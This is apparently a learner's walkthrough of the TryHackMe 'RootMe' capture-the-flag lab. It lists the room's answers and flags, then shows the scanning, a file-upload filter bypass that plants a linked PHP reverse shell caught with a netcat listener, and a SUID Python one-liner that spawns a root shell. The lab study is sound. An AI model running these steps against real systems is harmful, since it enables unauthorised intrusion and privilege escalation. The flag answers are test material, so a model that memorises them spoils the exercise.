# RootMe

**Date:** 09.02.2025  
**Difficulty:** Easy

---

## Questions and Answers ✅

1. Scan the machine, how many ports are open?
`2`
2. What version of Apache is running?
`2.4.29`
3. What service is running on port 22?
`ssh`
4. What is the hidden directory?
`/panel/`
5. user.txt (flag)?
`THM{y0u_g0t_a_sh3ll}`
6. Search for files with SUID permission, which file is weird?
`/usr/bin/python`
7. root.txt (flag)?
`THM{pr1v1l3g3_3sc4l4t10n}`
---

## Obtained Information 🔍

- **Target IP Address:** `<IP_ADDRESS>`
- open ports: 22 | 80
- website lets unverified file upload and we can access uploaded files
- 

---

## Process 🕵️‍♂️

1. Using nmap to scan open ports:
```bash
nmap -sV -sS <IP_ADDRESS>
```

*Results*
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

So we have found answers for 3 questions at once!

2. Using gobuster to get hidden directory:
```bash
gobuster dir -u "http://<IP_ADDRESS>" -w ./Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x .js,.php
```

*Results*
```bash
/index.php            (Status: 200) [Size: 616]
/.php                 (Status: 403) [Size: 278]
/uploads              (Status: 200) [Size: 744]
/css                  (Status: 200) [Size: 1126]
/js                   (Status: 200) [Size: 959]
/panel                (Status: 200) [Size: 732]
/server-status        (Status: 403) [Size: 278]
```

Another question answered!

3. Exploiting unauthorized files upload available on web server by setting up listening on port 1234 for incoming connections:
```bash
nc -vnlp 1234
```

and uploading reverse shell script (after editing line 49 and 50):
*script:* https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

4. While trying to upload a file we get an error, saying that we can't upload php files. We can omit that in many ways. I used adding dot (.) at the end of the file name (after extension).

5. Now we got control over target system. Running 
```bash
find . -type f -name "user.txt"
``` 
we can find that file in var/www directory and 
```bash
cat ./var/www/user.txt
```

We got a flag!

6. Next we use command to search through files with SUID permission to say which file is weid:
```bash
find / -user root -perm /4000 | grep -v "Permission"
```
I wanted to exclude a lot of "Permission denied" files. The answer for the question is /usr/bin/python!

7. This file is weird, because it is present on *GTFOBins* list, which means we can use this file as vulnerability. One of there is privilege escalation:
```text
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.
```

So we run found script:
```bash
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami  
root
```

Now we have access to root folder where we should find our second flag and answer to last question.

8. Flag found at root dir.

---

## Reflection & Questions for Further Research 🤔💡

- Why php script is executed when opened and python or bash scripts are not?

---

## Summary & Takeaways 📌📖

- learned that we can search for files that needs root permission 
- What is SUID (/4000)
- learned about GTFOBins and using binary files to escalate privileges (earlier thought that /bin means some container, like trash bin 🤣)

---